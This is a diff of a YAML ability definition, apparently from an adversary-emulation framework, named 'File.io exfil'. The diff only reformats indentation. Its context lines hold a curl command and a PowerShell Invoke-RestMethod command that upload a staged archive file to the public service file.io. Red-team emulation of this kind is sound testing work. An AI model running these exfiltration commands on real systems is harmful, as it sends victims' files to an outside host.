@@ -1,9 +1,9 @@
 id: ea713bc4-63f0-491c-9a6f-0b01d560b87e
 metadata:
   authors:
-    - privateducky
+  - privateducky
   tags:
-    - Crown Jewels
+  - Crown Jewels
 name: File.io exfil
 description: |
   File.io is a common internet file share service which allows arbitrary file upload and it outputs a link, which can
@@ -23,6 +23,6 @@ platforms:
         curl -F "file=@#{file.T1560.001}" https://file.io
   windows:
     psh:
-      command: |
+      command: |-
         $body = "file=$(Get-Content #{file.T1560.001} -raw)";
         Invoke-RestMethod -Uri https://file.io -Method POST -body $body;
